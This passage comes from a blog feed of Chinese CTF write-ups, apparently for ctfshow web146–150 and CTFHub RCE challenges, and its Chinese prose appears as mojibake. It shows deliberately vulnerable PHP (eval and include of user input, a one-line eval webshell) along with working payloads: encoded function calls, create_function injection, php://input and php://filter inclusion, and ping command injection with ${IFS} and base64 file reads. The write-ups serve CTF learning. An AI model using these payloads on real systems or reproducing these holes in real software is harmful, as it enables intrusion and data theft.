class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>paylod: ?v1=1&amp;v2=2&amp;v3=|(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%93%9E%98%D1%8F%97%8F)|</code></p><ul><li>è·Ÿä¸Šé¢˜ä¸€æ ·</li></ul><h1 id="web147-create-function"><a href="#web147-create-function" class="headerlink" title="web147(create_function)"></a>web147(create_function)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="variable">$ctfshow</span>)) &#123;</span><br><span class="line">        <span class="variable">$ctfshow</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;show&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?show=&#125;system(&quot;tac flag.php&quot;);//    ctf=\create_function</code></p><ul><li>åŒ¿åå‡½æ•°ï¼š<code>create_function</code>ï¼ˆåœ¨php5.3.0 æˆ–ä»¥ä¸Šæ‰èƒ½ä½¿ç”¨ï¼‰</li><li>åœ¨ä¼ å‚ä¸­ï¼Œå› ä¸ºä½¿ç”¨äº†åŒ¿åå‡½æ•°ï¼Œæ‰€ä»¥éœ€è¦ä¸€ä¸ª<code>&#125;</code>æ¥é—­åˆå‰é¢çš„<code>&#123;</code>ï¼Œåœ¨æœ€åç”¨æ³¨é‡Šç¬¦å·å°†åŸæ¥çš„<code>&#125;</code>æ³¨é‡Šæ‰</li></ul><h1 id="web148-å¼‚æˆ–"><a href="#web148-å¼‚æˆ–" class="headerlink" title="web148(å¼‚æˆ–)"></a>web148(å¼‚æˆ–)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9_\%\\|\~\&#x27;\,\.\:\@\&amp;\*\+\- ]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_ctfshow_fl0g</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?code=(%aa%aa%aa%aa%aa%aa^%d9%d3%d9%de%cf%c7)(%aa%aa%aa%aa%aa%aa%aa%aa%aa%aa%aa%aa^%de%cb%c9%8a%cc%c6%cb%cd%84%da%c2%da);</code></p><ul><li>å¯ä»¥ç”¨<code>^</code>ï¼Œæ‰€ä»¥ç”¨å¼‚æˆ–æ„é€ ã€‚</li></ul><blockquote><p>psï¼šæ„Ÿè§‰è€ƒçš„çŸ¥è¯†ç‚¹å¹¶ä¸æ˜¯è¿™ä¸ªã€‚ã€‚ã€‚</p></blockquote><h1 id="web149-file-put-contents"><a href="#web149-file-put-contents" class="headerlink" title="web149(file_put_contents)"></a>web149(file_put_contents)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;show&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: /index.php    1=system(&quot;cat /ctfshow_fl0g_here.txt&quot;);</code></p><ul><li><code>unlink</code>ï¼šåˆ é™¤æ–‡ä»¶</li><li>å¦‚æœ<code>$file</code>çš„åå­—ä¸ä¸º<code>index.php</code>ï¼Œå°±ä¼šè¢«åˆ é™¤ï¼Œè€Œä¸‹é¢è¿˜æœ‰<code>file_put_contents</code>å‡½æ•°ï¼Œæç¤ºå·²ç»å¾ˆæ˜æ˜¾äº†</li><li>è§£é¢˜æ€è·¯ï¼š<ul><li>å…ˆåˆ©ç”¨<code>file_put_contents</code>å‡½æ•°ï¼Œä»¥GETæ–¹å¼ä¼ <code>index.php</code>ä¸ºæ–‡ä»¶åï¼Œåœ¨ä»¥POSTæ–¹å¼ä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œå‘ç°ä¸Šä¼ æˆåŠŸ</li><li>è®¿é—®<code>index.php</code>æ–‡ä»¶ï¼Œå°±å¯ä»¥rceäº†</li></ul></li></ul><h1 id="web150"><a href="#web150" class="headerlink" title="web150()"></a>web150()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTFSHOW</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$vip</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$secret</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;vip = <span class="number">0</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;secret = <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isVIP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;vip?<span class="literal">TRUE</span>:<span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$class</span>))&#123;</span><br><span class="line">            <span class="variable">$class</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#è¿‡æ»¤å­—ç¬¦</span></span><br><span class="line"><span class="variable">$key</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\_| |\[|\]|\?/&#x27;</span>, <span class="variable">$key</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctf</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">class_exists</span>(<span class="variable">$__CTFSHOW__</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;class is exists!&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$isVIP</span> &amp;&amp; <span class="title function_ invoke__">strrpos</span>(<span class="variable">$ctf</span>, <span class="string">&quot;:&quot;</span>)===<span class="literal">FALSE</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$ctf</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFSHOW </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFHUB RCE</title>
      <link href="/2023/07/26/CTFHUB%20RCE/"/>
      <url>/2023/07/26/CTFHUB%20RCE/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="evalæ‰§è¡Œ"><a href="#evalæ‰§è¡Œ" class="headerlink" title="evalæ‰§è¡Œ"></a>evalæ‰§è¡Œ</h2><p>æ‰“å¼€ç¯å¢ƒå‘ç°ä¸€æ®µphpä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å‘ç°å‚æ•°ä¸ºcmd</p><p><code>payloadï¼š?cmd=phpinfo();</code><br>æœ‰å›æ˜¾ï¼Œè¯´æ˜å¯ä»¥åˆ©ç”¨ç³»ç»Ÿå‘½ä»¤å‡½æ•°</p><p><code>payloadï¼š?cmd=system(&quot;ls /&quot;);</code><br>æœ‰å›æ˜¾ï¼Œå¹¶ä¸”çœ‹åˆ°æœ‰å…³äºflagçš„æ–‡ä»¶ï¼Œè¯»å–å®ƒ</p><p><code>payloadï¼š?cmd=system(&quot;ls / | cat /flag_9712&quot;);</code><br>å¾—åˆ°flag</p><h2 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h2><p>æ‰“å¼€ç¯å¢ƒå‘ç°ä¸€æ®µphpä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">strpos</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>], <span class="string">&quot;flag&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;hr&gt;</span><br><span class="line">i have a &lt;a href=<span class="string">&quot;shell.txt&quot;</span>&gt;shell&lt;/a&gt;, how to <span class="keyword">use</span> <span class="title">it</span> ?</span><br></pre></td></tr></table></figure><p>ä»‹ç»ä¸€ä¸‹é™Œç”Ÿå‡½æ•°ï¼š</p><blockquote><p>strpos(x,y)    æŸ¥çœ‹yæ˜¯å¦åœ¨xé‡Œ</p><p>include    å°†æ–‡ä»¶é‡Œçš„ä»£ç å½“ä½œåŸæ¥æ–‡ä»¶çš„ä»£ç æ‰§è¡Œ</p></blockquote><p>ç‚¹å‡»shellå¾—åˆ°ä¸€ä¸²phpä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;ctfhub&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ ¹æ®ä»£ç å¾—å‡ºï¼šéœ€è¦ç”¨GETä¼ å‚æ–¹å¼ä¼ å‚ï¼Œå‚æ•°ä¸ºfile</p><p><code>payloadï¼š?file=shell.txt</code><br>ç‚¹å‡»shellå¾—åˆ°phpä»£ç ï¼š<code>&lt;?php eval($_REQUEST[&#39;ctfhub&#39;]);?&gt;</code></p><p><code>payloadï¼šä»¥postæ–¹å¼ä¼ å‚ï¼šctfhub=system(&quot;ls&quot;)</code><br>æ ¹æ®å›æ˜¾å‘ç°æ²¡æœ‰æœ‰å…³flagçš„æ–‡ä»¶ï¼Œé‚£å°±è¯»å–ä¸Šçº§ç›®å½•çœ‹çœ‹</p><p><code>payloadï¼šctfhub=system(&quot;ls /&quot;)</code><br>æ ¹æ®å›æ˜¾å‘ç°flag</p><p><code>payloadï¼šctfhub=system(&quot;cat /flag&quot;)</code><br>å¾—åˆ°flag</p><h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h2><p>æ‰“å¼€ç¯å¢ƒå‘ç°phpä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>], <span class="number">0</span>, <span class="number">6</span>) === <span class="string">&quot;php://&quot;</span> ) &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;hr&gt;</span><br><span class="line">i don<span class="string">&#x27;t have shell, how to get flag? &lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;a href=&quot;phpinfo.php&quot;&gt;phpinfo&lt;/a&gt;</span></span><br></pre></td></tr></table></figure><p>æ ¹æ®ä»£ç å¾—å‡ºï¼šéœ€è¦ä»¥GETæ–¹å¼ä¼ å…¥ä¸€ä¸ªåä¸ºfileå‚æ•°çš„æ•°æ®ï¼Œç‚¹å‡»phpinfo()å‘ç°ï¼Œphp://inputå¯ä»¥ä½¿ç”¨</p><p><code>payloadï¼š?file=php://input</code><br>æ ¹æ®<code>php://input</code>è§„åˆ™ï¼Œéœ€è¦POSTä¼ å…¥æ•°æ®</p><p><code>payloadï¼š&lt;?php system(&quot;ls&quot;);?&gt;</code><br>æ ¹æ®å›æ˜¾å‘ç°æ²¡æœ‰flagï¼ŒæŸ¥æ‰¾ä¸Šçº§ç›®å½•</p><p><code>payloadï¼š&lt;?php system(&quot;ls /&quot;);?&gt;</code><br>å‘ç°flagï¼ŒæŸ¥çœ‹</p><p><code>payloadï¼š&lt;?php system(&quot;cat /flag_4801&quot;);?&gt;</code><br>å¾—åˆ°flag</p><h2 id="è¯»å–æºä»£ç "><a href="#è¯»å–æºä»£ç " class="headerlink" title="è¯»å–æºä»£ç "></a>è¯»å–æºä»£ç </h2><p>æ‰“å¼€ç¯å¢ƒå¾—åˆ°phpä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>], <span class="number">0</span>, <span class="number">6</span>) === <span class="string">&quot;php://&quot;</span> ) &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;hr&gt;</span><br><span class="line">i don<span class="string">&#x27;t have shell, how to get flag? &lt;br&gt;</span></span><br><span class="line"><span class="string">flag in &lt;code&gt;/flag&lt;/code&gt;</span></span><br></pre></td></tr></table></figure><p>æ ¹æ®æç¤ºä½¿ç”¨php://inputå‘ç°ä¸ç®¡ç”¨ï¼Œç”¨ä¸€ä¸‹æ–°çš„ä¼ªåè®®å§â€”â€”php://filter</p><p><code>payloadï¼š?file=php://filter/resource=/flag</code><br>flagä¸€ä¸‹å­å°±å‡ºæ¥äº†å‘¢</p><h2 id="è¿œç¨‹åŒ…å«"><a href="#è¿œç¨‹åŒ…å«" class="headerlink" title="è¿œç¨‹åŒ…å«"></a>è¿œç¨‹åŒ…å«</h2><p>æ‰“å¼€ç¯å¢ƒå¾—åˆ°ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">strpos</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>], <span class="string">&quot;flag&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;hr&gt;</span><br><span class="line">i don<span class="string">&#x27;t have shell, how to get flag?&lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;a href=&quot;phpinfo.php&quot;&gt;phpinfo&lt;/a&gt;</span></span><br></pre></td></tr></table></figure><p>ç”¨ä¸€ä¸‹php://inputå§ï¼Œä¸€ä¸‹å­å°±å¾—åˆ°äº†flagå‘¢</p><p><code>payloadï¼š&lt;?php system(&quot;cat /flag&quot;);?&gt;</code></p><h2 id="å‘½ä»¤æ³¨å…¥"><a href="#å‘½ä»¤æ³¨å…¥" class="headerlink" title="å‘½ä»¤æ³¨å…¥"></a>å‘½ä»¤æ³¨å…¥</h2><p>æ ¹æ®å›æ˜¾å¾—å‡ºè¿™æ˜¯ä¸€ä¸ªping IPçš„é¢˜ç›®</p><p>pingä¸€ä¸‹baidu.comå¾—åˆ°å›æ˜¾</p><p><code>payloadï¼šbaidu.com | ls</code><br>å¾—åˆ°å›æ˜¾å¹¶å‘ç°å¯ç–‘.phpæ–‡ä»¶ï¼Œæ‰“å¼€å‘ç°æ‰“ä¸å¼€è¯¥æ–‡ä»¶ï¼Œè¯•ä¸€ä¸‹base64å§</p><p><code>payloadï¼šbaidu.com | cat 31327443624755.php | base64</code><br>å†è§£ç å¾—åˆ°flag</p><h2 id="è¿‡æ»¤cat"><a href="#è¿‡æ»¤cat" class="headerlink" title="è¿‡æ»¤cat"></a>è¿‡æ»¤cat</h2><p>ç›´æ¥ä¸Špayload</p><p><code>payloadï¼šbaidu.com | ls</code><br>å¾—åˆ°flagæ–‡ä»¶ï¼Œä½†æ˜¯catè¢«è¿‡æ»¤äº†ï¼Œæ¢ä¸ªå§</p><p><code>payloadï¼šbaidu.com | more flag_34911944417894.php | base64</code><br>å¾—åˆ°åŠ å¯†åçš„flagï¼Œè§£ç å¾—åˆ°flag</p><h2 id="è¿‡æ»¤ç©ºæ ¼"><a href="#è¿‡æ»¤ç©ºæ ¼" class="headerlink" title="è¿‡æ»¤ç©ºæ ¼"></a>è¿‡æ»¤ç©ºæ ¼</h2><p>ç›´æ¥ä¸Špayload</p><p><code>payloadï¼šbaidu.com | ls</code><br>å‘ç°æ²¡æœ‰ä¸œè¥¿ï¼Œç©ºæ ¼è¢«è¿‡æ»¤</p><p><code>payloadï¼šbaidu.com$&#123;IFS&#125;|$&#123;IFS&#125;ls</code><br>å¾—åˆ°flagæ–‡ä»¶ï¼ŒæŸ¥çœ‹è¯¥æ–‡ä»¶</p><p><code>payloadï¼šbaidu.com$&#123;IFS&#125;|$&#123;IFS&#125;cat$&#123;IFS&#125;flag_31123320624556.php$&#123;IFS&#125;|$&#123;IFS&#125;base64</code><br>è§£å¯†å¾—åˆ°flag</p><h2 id="è¿‡æ»¤ç›®å½•åˆ†éš”ç¬¦"><a 